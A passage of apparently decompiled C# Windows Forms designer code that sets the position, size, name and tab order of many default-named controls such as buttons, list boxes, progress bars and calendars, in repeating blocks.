			this.DateTimePicker10.Name = "DateTimePicker10";
			this.DateTimePicker10.Size = new Size(52, 20);
			this.DateTimePicker10.TabIndex = 160;
			this.ListBox14.FormattingEnabled = true;
			this.ListBox14.Location = new Point(731, 76);
			this.ListBox14.Name = "ListBox14";
			this.ListBox14.Size = new Size(47, 4);
			this.ListBox14.TabIndex = 159;
			this.Label5.AutoSize = true;
			this.Label5.Location = new Point(518, 249);
			this.Label5.Name = "Label5";
			this.Label5.Size = new Size(39, 13);
			this.Label5.TabIndex = 158;
			this.Label5.Text = "Label5";
			this.MaskedTextBox9.Location = new Point(376, 194);
			this.MaskedTextBox9.Name = "MaskedTextBox9";
			this.MaskedTextBox9.Size = new Size(83, 20);
			this.MaskedTextBox9.TabIndex = 157;
			this.RadioButton9.AutoSize = true;
			this.RadioButton9.Location = new Point(503, 216);
			this.RadioButton9.Name = "RadioButton9";
			this.RadioButton9.Size = new Size(90, 17);
			this.RadioButton9.TabIndex = 156;
			this.RadioButton9.TabStop = true;
			this.RadioButton9.Text = "RadioButton9";
			this.RadioButton9.UseVisualStyleBackColor = true;
			this.PictureBox9.Location = new Point(345, 296);
			this.PictureBox9.Name = "PictureBox9";
			this.PictureBox9.Size = new Size(20, 20);
			this.PictureBox9.TabIndex = 155;
			this.PictureBox9.TabStop = false;
			this.MaskedTextBox10.Location = new Point(365, 249);
			this.MaskedTextBox10.Name = "MaskedTextBox10";
			this.MaskedTextBox10.Size = new Size(141, 20);
			this.MaskedTextBox10.TabIndex = 154;
			this.WebBrowser5.Location = new Point(506, 179);
			this.WebBrowser5.MinimumSize = new Size(20, 20);
			this.WebBrowser5.Name = "WebBrowser5";
			this.WebBrowser5.Size = new Size(69, 20);
			this.WebBrowser5.TabIndex = 153;
			this.TreeView5.Location = new Point(253, 225);
			this.TreeView5.Name = "TreeView5";
			this.TreeView5.Size = new Size(183, 112);
			this.TreeView5.TabIndex = 152;
			this.PictureBox10.Location = new Point(550, 216);
			this.PictureBox10.Name = "PictureBox10";
			this.PictureBox10.Size = new Size(166, 43);
			this.PictureBox10.TabIndex = 151;
			this.PictureBox10.TabStop = false;
			this.NumericUpDown5.Location = new Point(164, 312);
			this.NumericUpDown5.Name = "NumericUpDown5";
			this.NumericUpDown5.Size = new Size(78, 20);
			this.NumericUpDown5.TabIndex = 150;
			this.ProgressBar19.Location = new Point(84, 274);
			this.ProgressBar19.Name = "ProgressBar19";
			this.ProgressBar19.Size = new Size(74, 44);
			this.ProgressBar19.TabIndex = 149;
			this.RadioButton10.AutoSize = true;
			this.RadioButton10.Location = new Point(109, 346);
			this.RadioButton10.Name = "RadioButton10";
			this.RadioButton10.Size = new Size(96, 17);
			this.RadioButton10.TabIndex = 148;
			this.RadioButton10.TabStop = true;
			this.RadioButton10.Text = "RadioButton10";
			this.RadioButton10.UseVisualStyleBackColor = true;
			this.LinkLabel13.AutoSize = true;
			this.LinkLabel13.Location = new Point(71, 275);
			this.LinkLabel13.Name = "LinkLabel13";
			this.LinkLabel13.Size = new Size(65, 13);
			this.LinkLabel13.TabIndex = 147;
			this.LinkLabel13.TabStop = true;
			this.LinkLabel13.Text = "LinkLabel13";
			this.CheckBox9.AutoSize = true;
			this.CheckBox9.Location = new Point(207, 126);
			this.CheckBox9.Name = "CheckBox9";
			this.CheckBox9.Size = new Size(81, 17);
			this.CheckBox9.TabIndex = 146;
			this.CheckBox9.Text = "CheckBox9";
			this.CheckBox9.UseVisualStyleBackColor = true;
			this.ComboBox9.FormattingEnabled = true;
			this.ComboBox9.Location = new Point(198, 87);
			this.ComboBox9.Name = "ComboBox9";
			this.ComboBox9.Size = new Size(115, 21);
			this.ComboBox9.TabIndex = 145;
			this.Button9.Location = new Point(575, 194);
			this.Button9.Name = "Button9";
			this.Button9.Size = new Size(75, 23);
			this.Button9.TabIndex = 144;
			this.Button9.Text = "Button9";
			this.Button9.UseVisualStyleBackColor = true;
			this.CheckedListBox14.FormattingEnabled = true;
			this.CheckedListBox14.Location = new Point(74, 207);
			this.CheckedListBox14.Name = "CheckedListBox14";
			this.CheckedListBox14.Size = new Size(222, 4);
			this.CheckedListBox14.TabIndex = 143;
			this.ComboBox10.FormattingEnabled = true;
			this.ComboBox10.Location = new Point(196, 118);
			this.ComboBox10.Name = "ComboBox10";
			this.ComboBox10.Size = new Size(101, 21);
			this.ComboBox10.TabIndex = 142;
			this.MonthCalendar10.Location = new Point(132, 157);
			this.MonthCalendar10.Name = "MonthCalendar10";
			this.MonthCalendar10.TabIndex = 141;
			this.MonthCalendar11.Location = new Point(459, 280);
			this.MonthCalendar11.Name = "MonthCalendar11";
			this.MonthCalendar11.TabIndex = 140;
			this.LinkLabel14.AutoSize = true;
			this.LinkLabel14.Location = new Point(139, 88);
			this.LinkLabel14.Name = "LinkLabel14";
			this.LinkLabel14.Size = new Size(65, 13);
			this.LinkLabel14.TabIndex = 139;
			this.LinkLabel14.TabStop = true;
			this.LinkLabel14.Text = "LinkLabel14";
			this.ProgressBar20.Location = new Point(110, 176);
			this.ProgressBar20.Name = "ProgressBar20";
			this.ProgressBar20.Size = new Size(93, 107);
			this.ProgressBar20.TabIndex = 138;
			this.LinkLabel15.AutoSize = true;
			this.LinkLabel15.Location = new Point(490, 262);
			this.LinkLabel15.Name = "LinkLabel15";
			this.LinkLabel15.Size = new Size(65, 13);
			this.LinkLabel15.TabIndex = 137;
			this.LinkLabel15.TabStop = true;
			this.LinkLabel15.Text = "LinkLabel15";
			this.ListBox15.FormattingEnabled = true;
			this.ListBox15.Location = new Point(297, 327);
			this.ListBox15.Name = "ListBox15";
			this.ListBox15.Size = new Size(165, 69);
			this.ListBox15.TabIndex = 136;
			this.CheckBox10.AutoSize = true;
			this.CheckBox10.Location = new Point(187, 296);
			this.CheckBox10.Name = "CheckBox10";
			this.CheckBox10.Size = new Size(87, 17);
			this.CheckBox10.TabIndex = 135;
			this.CheckBox10.Text = "CheckBox10";
			this.CheckBox10.UseVisualStyleBackColor = true;
			this.CheckedListBox15.FormattingEnabled = true;
			this.CheckedListBox15.Location = new Point(348, 131);
			this.CheckedListBox15.Name = "CheckedListBox15";
			this.CheckedListBox15.Size = new Size(303, 49);
			this.CheckedListBox15.TabIndex = 134;
			this.Button10.Location = new Point(266, 176);
			this.Button10.Name = "Button10";
			this.Button10.Size = new Size(156, 50);
			this.Button10.TabIndex = 133;
			this.Button10.Text = "Button10";
			this.Button10.UseVisualStyleBackColor = true;
			this.ProgressBar21.Location = new Point(83, 111);
			this.ProgressBar21.Name = "ProgressBar21";
			this.ProgressBar21.Size = new Size(57, 54);
			this.ProgressBar21.TabIndex = 198;
			this.ProgressBar22.Location = new Point(729, 294);
			this.ProgressBar22.Name = "ProgressBar22";
			this.ProgressBar22.Size = new Size(40, 96);
			this.ProgressBar22.TabIndex = 197;
			this.DateTimePicker11.Location = new Point(674, 244);
			this.DateTimePicker11.Name = "DateTimePicker11";
			this.DateTimePicker11.Size = new Size(85, 20);
			this.DateTimePicker11.TabIndex = 196;
			this.CheckedListBox16.FormattingEnabled = true;
			this.CheckedListBox16.Location = new Point(449, 76);
			this.CheckedListBox16.Name = "CheckedListBox16";
			this.CheckedListBox16.Size = new Size(151, 49);
			this.CheckedListBox16.TabIndex = 195;
			this.ListBox16.FormattingEnabled = true;
			this.ListBox16.Location = new Point(721, 153);
			this.ListBox16.Name = "ListBox16";
			this.ListBox16.Size = new Size(49, 69);
			this.ListBox16.TabIndex = 194;
			this.DateTimePicker12.Location = new Point(671, 65);
			this.DateTimePicker12.Name = "DateTimePicker12";
			this.DateTimePicker12.Size = new Size(52, 20);
			this.DateTimePicker12.TabIndex = 193;
			this.ListBox17.FormattingEnabled = true;
			this.ListBox17.Location = new Point(739, 84);
			this.ListBox17.Name = "ListBox17";
			this.ListBox17.Size = new Size(47, 4);
			this.ListBox17.TabIndex = 192;
			this.Label6.AutoSize = true;
			this.Label6.Location = new Point(526, 257);
			this.Label6.Name = "Label6";
			this.Label6.Size = new Size(39, 13);
			this.Label6.TabIndex = 191;
			this.Label6.Text = "Label6";
			this.MaskedTextBox11.Location = new Point(384, 202);
			this.MaskedTextBox11.Name = "MaskedTextBox11";
			this.MaskedTextBox11.Size = new Size(83, 20);
			this.MaskedTextBox11.TabIndex = 190;
			this.RadioButton11.AutoSize = true;
			this.RadioButton11.Location = new Point(511, 224);
			this.RadioButton11.Name = "RadioButton11";
			this.RadioButton11.Size = new Size(96, 17);
			this.RadioButton11.TabIndex = 189;
			this.RadioButton11.TabStop = true;
			this.RadioButton11.Text = "RadioButton11";
			this.RadioButton11.UseVisualStyleBackColor = true;
			this.PictureBox11.Location = new Point(353, 304);
			this.PictureBox11.Name = "PictureBox11";
			this.PictureBox11.Size = new Size(20, 20);
			this.PictureBox11.TabIndex = 188;
			this.PictureBox11.TabStop = false;
			this.MaskedTextBox12.Location = new Point(373, 257);
			this.MaskedTextBox12.Name = "MaskedTextBox12";
			this.MaskedTextBox12.Size = new Size(141, 20);
			this.MaskedTextBox12.TabIndex = 187;
			this.WebBrowser6.Location = new Point(514, 187);
			this.WebBrowser6.MinimumSize = new Size(20, 20);
			this.WebBrowser6.Name = "WebBrowser6";
			this.WebBrowser6.Size = new Size(69, 20);
			this.WebBrowser6.TabIndex = 186;
			this.TreeView6.Location = new Point(261, 233);
			this.TreeView6.Name = "TreeView6";
			this.TreeView6.Size = new Size(183, 112);
			this.TreeView6.TabIndex = 185;
			this.PictureBox12.Location = new Point(558, 224);
			this.PictureBox12.Name = "PictureBox12";
			this.PictureBox12.Size = new Size(166, 43);
			this.PictureBox12.TabIndex = 184;
			this.PictureBox12.TabStop = false;
			this.NumericUpDown6.Location = new Point(172, 320);
			this.NumericUpDown6.Name = "NumericUpDown6";
			this.NumericUpDown6.Size = new Size(78, 20);
			this.NumericUpDown6.TabIndex = 183;
			this.ProgressBar23.Location = new Point(92, 282);
			this.ProgressBar23.Name = "ProgressBar23";
			this.ProgressBar23.Size = new Size(74, 44);
			this.ProgressBar23.TabIndex = 182;
			this.RadioButton12.AutoSize = true;
			this.RadioButton12.Location = new Point(117, 354);
			this.RadioButton12.Name = "RadioButton12";
			this.RadioButton12.Size = new Size(96, 17);
			this.RadioButton12.TabIndex = 181;
			this.RadioButton12.TabStop = true;
			this.RadioButton12.Text = "RadioButton12";
			this.RadioButton12.UseVisualStyleBackColor = true;
			this.LinkLabel16.AutoSize = true;
			this.LinkLabel16.Location = new Point(79, 283);
			this.LinkLabel16.Name = "LinkLabel16";
			this.LinkLabel16.Size = new Size(65, 13);
			this.LinkLabel16.TabIndex = 180;
			this.LinkLabel16.TabStop = true;
			this.LinkLabel16.Text = "LinkLabel16";
			this.CheckBox11.AutoSize = true;
			this.CheckBox11.Location = new Point(215, 134);
			this.CheckBox11.Name = "CheckBox11";
			this.CheckBox11.Size = new Size(87, 17);
			this.CheckBox11.TabIndex = 179;
			this.CheckBox11.Text = "CheckBox11";
			this.CheckBox11.UseVisualStyleBackColor = true;
			this.ComboBox11.FormattingEnabled = true;
			this.ComboBox11.Location = new Point(206, 95);
			this.ComboBox11.Name = "ComboBox11";
			this.ComboBox11.Size = new Size(115, 21);
			this.ComboBox11.TabIndex = 178;
			this.Button11.Location = new Point(583, 202);
			this.Button11.Name = "Button11";
			this.Button11.Size = new Size(75, 23);
			this.Button11.TabIndex = 177;
			this.Button11.Text = "Button11";
			this.Button11.UseVisualStyleBackColor = true;
			this.CheckedListBox17.FormattingEnabled = true;
			this.CheckedListBox17.Location = new Point(82, 215);
			this.CheckedListBox17.Name = "CheckedListBox17";
			this.CheckedListBox17.Size = new Size(222, 4);
			this.CheckedListBox17.TabIndex = 176;
			this.ComboBox12.FormattingEnabled = true;
			this.ComboBox12.Location = new Point(204, 126);
			this.ComboBox12.Name = "ComboBox12";
			this.ComboBox12.Size = new Size(101, 21);
			this.ComboBox12.TabIndex = 175;
			this.MonthCalendar12.Location = new Point(140, 165);
			this.MonthCalendar12.Name = "MonthCalendar12";
			this.MonthCalendar12.TabIndex = 174;
			this.MonthCalendar13.Location = new Point(467, 288);
			this.MonthCalendar13.Name = "MonthCalendar13";
			this.MonthCalendar13.TabIndex = 173;
			this.LinkLabel17.AutoSize = true;
			this.LinkLabel17.Location = new Point(147, 96);
			this.LinkLabel17.Name = "LinkLabel17";
			this.LinkLabel17.Size = new Size(65, 13);
			this.LinkLabel17.TabIndex = 172;
			this.LinkLabel17.TabStop = true;
			this.LinkLabel17.Text = "LinkLabel17";
			this.ProgressBar24.Location = new Point(118, 184);
			this.ProgressBar24.Name = "ProgressBar24";
			this.ProgressBar24.Size = new Size(93, 107);
			this.ProgressBar24.TabIndex = 171;
			this.LinkLabel18.AutoSize = true;
			this.LinkLabel18.Location = new Point(498, 270);
			this.LinkLabel18.Name = "LinkLabel18";
			this.LinkLabel18.Size = new Size(65, 13);
			this.LinkLabel18.TabIndex = 170;
			this.LinkLabel18.TabStop = true;
			this.LinkLabel18.Text = "LinkLabel18";
			this.ListBox18.FormattingEnabled = true;
			this.ListBox18.Location = new Point(305, 335);
			this.ListBox18.Name = "ListBox18";
			this.ListBox18.Size = new Size(165, 69);
			this.ListBox18.TabIndex = 169;
			this.CheckBox12.AutoSize = true;
			this.CheckBox12.Location = new Point(195, 304);
			this.CheckBox12.Name = "CheckBox12";
			this.CheckBox12.Size = new Size(87, 17);
			this.CheckBox12.TabIndex = 168;
			this.CheckBox12.Text = "CheckBox12";
			this.CheckBox12.UseVisualStyleBackColor = true;
			this.CheckedListBox18.FormattingEnabled = true;
			this.CheckedListBox18.Location = new Point(356, 139);
			this.CheckedListBox18.Name = "CheckedListBox18";
			this.CheckedListBox18.Size = new Size(303, 49);
			this.CheckedListBox18.TabIndex = 167;
			this.Button12.Location = new Point(274, 184);
			this.Button12.Name = "Button12";
			this.Button12.Size = new Size(156, 50);
			this.Button12.TabIndex = 166;
			this.Button12.Text = "Button12";
			this.Button12.UseVisualStyleBackColor = true;
			this.ProgressBar25.Location = new Point(67, 76);
			this.ProgressBar25.Name = "ProgressBar25";
			this.ProgressBar25.Size = new Size(57, 54);
			this.ProgressBar25.TabIndex = 397;
			this.ProgressBar26.Location = new Point(713, 259);
			this.ProgressBar26.Name = "ProgressBar26";
			this.ProgressBar26.Size = new Size(40, 96);
			this.ProgressBar26.TabIndex = 396;
			this.DateTimePicker13.Location = new Point(658, 209);
			this.DateTimePicker13.Name = "DateTimePicker13";
			this.DateTimePicker13.Size = new Size(85, 20);
			this.DateTimePicker13.TabIndex = 395;
			this.CheckedListBox19.FormattingEnabled = true;
			this.CheckedListBox19.Location = new Point(433, 41);
			this.CheckedListBox19.Name = "CheckedListBox19";
			this.CheckedListBox19.Size = new Size(151, 49);
			this.CheckedListBox19.TabIndex = 394;
			this.ListBox19.FormattingEnabled = true;
			this.ListBox19.Location = new Point(705, 118);
			this.ListBox19.Name = "ListBox19";
			this.ListBox19.Size = new Size(49, 69);
			this.ListBox19.TabIndex = 393;
			this.DateTimePicker14.Location = new Point(655, 30);
			this.DateTimePicker14.Name = "DateTimePicker14";
			this.DateTimePicker14.Size = new Size(52, 20);
			this.DateTimePicker14.TabIndex = 392;
			this.ListBox20.FormattingEnabled = true;
			this.ListBox20.Location = new Point(723, 49);
			this.ListBox20.Name = "ListBox20";
			this.ListBox20.Size = new Size(47, 4);
			this.ListBox20.TabIndex = 391;
			this.Label7.AutoSize = true;
			this.Label7.Location = new Point(510, 222);
			this.Label7.Name = "Label7";
			this.Label7.Size = new Size(39, 13);
			this.Label7.TabIndex = 390;
			this.Label7.Text = "Label7";
			this.MaskedTextBox13.Location = new Point(368, 167);
			this.MaskedTextBox13.Name = "MaskedTextBox13";
			this.MaskedTextBox13.Size = new Size(83, 20);
			this.MaskedTextBox13.TabIndex = 389;
			this.RadioButton13.AutoSize = true;
			this.RadioButton13.Location = new Point(495, 189);
			this.RadioButton13.Name = "RadioButton13";
			this.RadioButton13.Size = new Size(96, 17);
			this.RadioButton13.TabIndex = 388;
			this.RadioButton13.TabStop = true;
			this.RadioButton13.Text = "RadioButton13";
			this.RadioButton13.UseVisualStyleBackColor = true;
			this.PictureBox13.Location = new Point(337, 269);
			this.PictureBox13.Name = "PictureBox13";
			this.PictureBox13.Size = new Size(20, 20);
			this.PictureBox13.TabIndex = 387;
			this.PictureBox13.TabStop = false;
			this.MaskedTextBox14.Location = new Point(357, 222);
			this.MaskedTextBox14.Name = "MaskedTextBox14";
			this.MaskedTextBox14.Size = new Size(141, 20);
			this.MaskedTextBox14.TabIndex = 386;
			this.WebBrowser7.Location = new Point(498, 152);
			this.WebBrowser7.MinimumSize = new Size(20, 20);
			this.WebBrowser7.Name = "WebBrowser7";
			this.WebBrowser7.Size = new Size(69, 20);
			this.WebBrowser7.TabIndex = 385;
			this.TreeView7.Location = new Point(245, 198);
			this.TreeView7.Name = "TreeView7";
			this.TreeView7.Size = new Size(183, 112);
			this.TreeView7.TabIndex = 384;
			this.PictureBox14.Location = new Point(542, 189);
			this.PictureBox14.Name = "PictureBox14";
			this.PictureBox14.Size = new Size(166, 43);
			this.PictureBox14.TabIndex = 383;
			this.PictureBox14.TabStop = false;
			this.NumericUpDown7.Location = new Point(156, 285);
			this.NumericUpDown7.Name = "NumericUpDown7";
			this.NumericUpDown7.Size = new Size(78, 20);
			this.NumericUpDown7.TabIndex = 382;
			this.ProgressBar27.Location = new Point(76, 247);
			this.ProgressBar27.Name = "ProgressBar27";
			this.ProgressBar27.Size = new Size(74, 44);
			this.ProgressBar27.TabIndex = 381;
			this.RadioButton14.AutoSize = true;
			this.RadioButton14.Location = new Point(101, 319);
			this.RadioButton14.Name = "RadioButton14";
			this.RadioButton14.Size = new Size(96, 17);
			this.RadioButton14.TabIndex = 380;
			this.RadioButton14.TabStop = true;
			this.RadioButton14.Text = "RadioButton14";
			this.RadioButton14.UseVisualStyleBackColor = true;
			this.LinkLabel19.AutoSize = true;
			this.LinkLabel19.Location = new Point(63, 248);
			this.LinkLabel19.Name = "LinkLabel19";
			this.LinkLabel19.Size = new Size(65, 13);
			this.LinkLabel19.TabIndex = 379;
			this.LinkLabel19.TabStop = true;
			this.LinkLabel19.Text = "LinkLabel19";
			this.CheckBox13.AutoSize = true;
			this.CheckBox13.Location = new Point(199, 99);
			this.CheckBox13.Name = "CheckBox13";
			this.CheckBox13.Size = new Size(87, 17);
			this.CheckBox13.TabIndex = 378;
			this.CheckBox13.Text = "CheckBox13";
			this.CheckBox13.UseVisualStyleBackColor = true;
			this.ComboBox13.FormattingEnabled = true;
			this.ComboBox13.Location = new Point(190, 60);
			this.ComboBox13.Name = "ComboBox13";
			this.ComboBox13.Size = new Size(115, 21);
			this.ComboBox13.TabIndex = 377;
			this.Button13.Location = new Point(567, 167);
			this.Button13.Name = "Button13";
			this.Button13.Size = new Size(75, 23);
			this.Button13.TabIndex = 376;
			this.Button13.Text = "Button13";
			this.Button13.UseVisualStyleBackColor = true;
			this.CheckedListBox20.FormattingEnabled = true;
			this.CheckedListBox20.Location = new Point(66, 180);
			this.CheckedListBox20.Name = "CheckedListBox20";
			this.CheckedListBox20.Size = new Size(222, 4);
			this.CheckedListBox20.TabIndex = 375;
			this.ComboBox14.FormattingEnabled = true;
			this.ComboBox14.Location = new Point(188, 91);
			this.ComboBox14.Name = "ComboBox14";
			this.ComboBox14.Size = new Size(101, 21);
			this.ComboBox14.TabIndex = 374;
			this.MonthCalendar14.Location = new Point(124, 130);
			this.MonthCalendar14.Name = "MonthCalendar14";
			this.MonthCalendar14.TabIndex = 373;
			this.MonthCalendar15.Location = new Point(451, 253);
			this.MonthCalendar15.Name = "MonthCalendar15";
			this.MonthCalendar15.TabIndex = 372;
			this.LinkLabel20.AutoSize = true;
			this.LinkLabel20.Location = new Point(131, 61);
			this.LinkLabel20.Name = "LinkLabel20";
			this.LinkLabel20.Size = new Size(65, 13);
			this.LinkLabel20.TabIndex = 371;
			this.LinkLabel20.TabStop = true;
			this.LinkLabel20.Text = "LinkLabel20";
			this.ProgressBar28.Location = new Point(102, 149);
			this.ProgressBar28.Name = "ProgressBar28";
			this.ProgressBar28.Size = new Size(93, 107);
			this.ProgressBar28.TabIndex = 370;
			this.LinkLabel21.AutoSize = true;
			this.LinkLabel21.Location = new Point(482, 235);
			this.LinkLabel21.Name = "LinkLabel21";
			this.LinkLabel21.Size = new Size(65, 13);
			this.LinkLabel21.TabIndex = 369;
			this.LinkLabel21.TabStop = true;
			this.LinkLabel21.Text = "LinkLabel21";
			this.ListBox21.FormattingEnabled = true;
			this.ListBox21.Location = new Point(289, 300);
			this.ListBox21.Name = "ListBox21";
			this.ListBox21.Size = new Size(165, 69);
			this.ListBox21.TabIndex = 368;
			this.CheckBox14.AutoSize = true;
			this.CheckBox14.Location = new Point(179, 269);
			this.CheckBox14.Name = "CheckBox14";
			this.CheckBox14.Size = new Size(87, 17);
			this.CheckBox14.TabIndex = 367;
			this.CheckBox14.Text = "CheckBox14";
			this.CheckBox14.UseVisualStyleBackColor = true;
			this.CheckedListBox21.FormattingEnabled = true;
			this.CheckedListBox21.Location = new Point(340, 104);
			this.CheckedListBox21.Name = "CheckedListBox21";
			this.CheckedListBox21.Size = new Size(303, 49);
			this.CheckedListBox21.TabIndex = 366;
			this.Button14.Location = new Point(258, 149);
			this.Button14.Name = "Button14";
			this.Button14.Size = new Size(156, 50);
			this.Button14.TabIndex = 365;
			this.Button14.Text = "Button14";
			this.Button14.UseVisualStyleBackColor = true;
			this.ProgressBar29.Location = new Point(59, 68);
			this.ProgressBar29.Name = "ProgressBar29";
			this.ProgressBar29.Size = new Size(57, 54);
			this.ProgressBar29.TabIndex = 364;
			this.ProgressBar30.Location = new Point(705, 251);
			this.ProgressBar30.Name = "ProgressBar30";
			this.ProgressBar30.Size = new Size(40, 96);
			this.ProgressBar30.TabIndex = 363;
			this.DateTimePicker15.Location = new Point(650, 201);
			this.DateTimePicker15.Name = "DateTimePicker15";
			this.DateTimePicker15.Size = new Size(85, 20);
			this.DateTimePicker15.TabIndex = 362;
			this.CheckedListBox22.FormattingEnabled = true;
			this.CheckedListBox22.Location = new Point(425, 33);
			this.CheckedListBox22.Name = "CheckedListBox22";
			this.CheckedListBox22.Size = new Size(151, 49);
			this.CheckedListBox22.TabIndex = 361;
			this.ListBox22.FormattingEnabled = true;
			this.ListBox22.Location = new Point(697, 110);
			this.ListBox22.Name = "ListBox22";
			this.ListBox22.Size = new Size(49, 69);
			this.ListBox22.TabIndex = 360;
			this.DateTimePicker16.Location = new Point(647, 22);
			this.DateTimePicker16.Name = "DateTimePicker16";
			this.DateTimePicker16.Size = new Size(52, 20);
			this.DateTimePicker16.TabIndex = 359;
			this.ListBox23.FormattingEnabled = true;
			this.ListBox23.Location = new Point(715, 41);
			this.ListBox23.Name = "ListBox23";
			this.ListBox23.Size = new Size(47, 4);
			this.ListBox23.TabIndex = 358;
			this.Label8.AutoSize = true;
			this.Label8.Location = new Point(502, 214);
			this.Label8.Name = "Label8";
			this.Label8.Size = new Size(39, 13);
			this.Label8.TabIndex = 357;
			this.Label8.Text = "Label8";
			this.MaskedTextBox15.Location = new Point(360, 159);
			this.MaskedTextBox15.Name = "MaskedTextBox15";
			this.MaskedTextBox15.Size = new Size(83, 20);
			this.MaskedTextBox15.TabIndex = 356;
			this.RadioButton15.AutoSize = true;
			this.RadioButton15.Location = new Point(487, 181);
			this.RadioButton15.Name = "RadioButton15";
			this.RadioButton15.Size = new Size(96, 17);
			this.RadioButton15.TabIndex = 355;
			this.RadioButton15.TabStop = true;
			this.RadioButton15.Text = "RadioButton15";
			this.RadioButton15.UseVisualStyleBackColor = true;
			this.PictureBox15.Location = new Point(329, 261);
			this.PictureBox15.Name = "PictureBox15";
			this.PictureBox15.Size = new Size(20, 20);
			this.PictureBox15.TabIndex = 354;
			this.PictureBox15.TabStop = false;
			this.MaskedTextBox16.Location = new Point(349, 214);
			this.MaskedTextBox16.Name = "MaskedTextBox16";
			this.MaskedTextBox16.Size = new Size(141, 20);
			this.MaskedTextBox16.TabIndex = 353;
			this.WebBrowser8.Location = new Point(490, 144);
			this.WebBrowser8.MinimumSize = new Size(20, 20);
			this.WebBrowser8.Name = "WebBrowser8";
			this.WebBrowser8.Size = new Size(69, 20);
			this.WebBrowser8.TabIndex = 352;
			this.TreeView8.Location = new Point(237, 190);
			this.TreeView8.Name = "TreeView8";
			this.TreeView8.Size = new Size(183, 112);
			this.TreeView8.TabIndex = 351;
			this.PictureBox16.Location = new Point(534, 181);
			this.PictureBox16.Name = "PictureBox16";
			this.PictureBox16.Size = new Size(166, 43);
			this.PictureBox16.TabIndex = 350;
			this.PictureBox16.TabStop = false;
			this.NumericUpDown8.Location = new Point(148, 277);
			this.NumericUpDown8.Name = "NumericUpDown8";
			this.NumericUpDown8.Size = new Size(78, 20);
			this.NumericUpDown8.TabIndex = 349;
			this.ProgressBar31.Location = new Point(68, 239);
			this.ProgressBar31.Name = "ProgressBar31";
			this.ProgressBar31.Size = new Size(74, 44);
			this.ProgressBar31.TabIndex = 348;
			this.RadioButton16.AutoSize = true;
			this.RadioButton16.Location = new Point(93, 311);
			this.RadioButton16.Name = "RadioButton16";
			this.RadioButton16.Size = new Size(96, 17);
			this.RadioButton16.TabIndex = 347;
			this.RadioButton16.TabStop = true;
			this.RadioButton16.Text = "RadioButton16";
			this.RadioButton16.UseVisualStyleBackColor = true;
			this.LinkLabel22.AutoSize = true;
			this.LinkLabel22.Location = new Point(55, 240);
			this.LinkLabel22.Name = "LinkLabel22";
			this.LinkLabel22.Size = new Size(65, 13);
			this.LinkLabel22.TabIndex = 346;
			this.LinkLabel22.TabStop = true;
			this.LinkLabel22.Text = "LinkLabel22";
			this.CheckBox15.AutoSize = true;
			this.CheckBox15.Location = new Point(191, 91);
			this.CheckBox15.Name = "CheckBox15";
			this.CheckBox15.Size = new Size(87, 17);
			this.CheckBox15.TabIndex = 345;
			this.CheckBox15.Text = "CheckBox15";
			this.CheckBox15.UseVisualStyleBackColor = true;
			this.ComboBox15.FormattingEnabled = true;
			this.ComboBox15.Location = new Point(182, 52);
			this.ComboBox15.Name = "ComboBox15";
			this.ComboBox15.Size = new Size(115, 21);
			this.ComboBox15.TabIndex = 344;
			this.Button15.Location = new Point(559, 159);
			this.Button15.Name = "Button15";
			this.Button15.Size = new Size(75, 23);
			this.Button15.TabIndex = 343;
			this.Button15.Text = "Button15";
			this.Button15.UseVisualStyleBackColor = true;
			this.CheckedListBox23.FormattingEnabled = true;
			this.CheckedListBox23.Location = new Point(58, 172);
			this.CheckedListBox23.Name = "CheckedListBox23";
			this.CheckedListBox23.Size = new Size(222, 4);
			this.CheckedListBox23.TabIndex = 342;
			this.ComboBox16.FormattingEnabled = true;
			this.ComboBox16.Location = new Point(180, 83);
			this.ComboBox16.Name = "ComboBox16";
			this.ComboBox16.Size = new Size(101, 21);
			this.ComboBox16.TabIndex = 341;
			this.MonthCalendar16.Location = new Point(116, 122);
			this.MonthCalendar16.Name = "MonthCalendar16";
			this.MonthCalendar16.TabIndex = 340;
			this.MonthCalendar17.Location = new Point(443, 245);
			this.MonthCalendar17.Name = "MonthCalendar17";
			this.MonthCalendar17.TabIndex = 339;
			this.LinkLabel23.AutoSize = true;
			this.LinkLabel23.Location = new Point(123, 53);
			this.LinkLabel23.Name = "LinkLabel23";
			this.LinkLabel23.Size = new Size(65, 13);
			this.LinkLabel23.TabIndex = 338;
			this.LinkLabel23.TabStop = true;
			this.LinkLabel23.Text = "LinkLabel23";
			this.ProgressBar32.Location = new Point(94, 141);
			this.ProgressBar32.Name = "ProgressBar32";
			this.ProgressBar32.Size = new Size(93, 107);
			this.ProgressBar32.TabIndex = 337;
			this.LinkLabel24.AutoSize = true;
			this.LinkLabel24.Location = new Point(474, 227);
			this.LinkLabel24.Name = "LinkLabel24";
			this.LinkLabel24.Size = new Size(65, 13);
			this.LinkLabel24.TabIndex = 336;
			this.LinkLabel24.TabStop = true;
			this.LinkLabel24.Text = "LinkLabel24";
			this.ListBox24.FormattingEnabled = true;
			this.ListBox24.Location = new Point(281, 292);
			this.ListBox24.Name = "ListBox24";
			this.ListBox24.Size = new Size(165, 69);
			this.ListBox24.TabIndex = 335;
			this.CheckBox16.AutoSize = true;
			this.CheckBox16.Location = new Point(171, 261);
			this.CheckBox16.Name = "CheckBox16";
			this.CheckBox16.Size = new Size(87, 17);
			this.CheckBox16.TabIndex = 334;
			this.CheckBox16.Text = "CheckBox16";
			this.CheckBox16.UseVisualStyleBackColor = true;
			this.CheckedListBox24.FormattingEnabled = true;
			this.CheckedListBox24.Location = new Point(332, 96);
			this.CheckedListBox24.Name = "CheckedListBox24";
			this.CheckedListBox24.Size = new Size(303, 49);
			this.CheckedListBox24.TabIndex = 333;
			this.Button16.Location = new Point(250, 141);
			this.Button16.Name = "Button16";
			this.Button16.Size = new Size(156, 50);
			this.Button16.TabIndex = 332;
			this.Button16.Text = "Button16";
			this.Button16.UseVisualStyleBackColor = true;
			this.ProgressBar33.Location = new Point(51, 60);
			this.ProgressBar33.Name = "ProgressBar33";
			this.ProgressBar33.Size = new Size(57, 54);
			this.ProgressBar33.TabIndex = 331;
			this.ProgressBar34.Location = new Point(697, 243);
			this.ProgressBar34.Name = "ProgressBar34";
			this.ProgressBar34.Size = new Size(40, 96);
			this.ProgressBar34.TabIndex = 330;
			this.DateTimePicker17.Location = new Point(642, 193);
			this.DateTimePicker17.Name = "DateTimePicker17";
			this.DateTimePicker17.Size = new Size(85, 20);
			this.DateTimePicker17.TabIndex = 329;
			this.CheckedListBox25.FormattingEnabled = true;
			this.CheckedListBox25.Location = new Point(417, 25);
			this.CheckedListBox25.Name = "CheckedListBox25";
			this.CheckedListBox25.Size = new Size(151, 49);
